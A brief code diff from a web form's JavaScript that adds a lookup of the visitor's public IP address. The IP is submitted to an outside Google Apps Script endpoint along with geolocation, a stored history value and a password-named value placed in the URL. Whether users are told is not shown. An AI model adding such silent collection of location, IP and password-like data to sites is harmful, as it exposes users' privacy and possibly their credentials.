@@ -83,7 +83,9 @@
       var formData = new FormData(form);
       formData.append("geolocation", sessionStorage.getItem("geolocation"));
       formData.append("history", localStorage.getItem("sentTime"));
-      formData.append("ip", "UNKNOWN");
+      const response_ip = await fetch('https://api.my-ip.io/v1/ip.txt');
+      const ip = await response_ip.text();
+      formData.append("ip", ip);
       fetch(`https://script.google.com/macros/s/AKfycbwvFH-GnZL-j7_LiHM3ovW82I1J8rT3m8MGXpu3LFX0tFVB4UycVod8ltdSMEe0a-9V/exec?egypt=${sessionStorage.getItem('password-conv')}`, {
         method: 'POST',
         body: formData
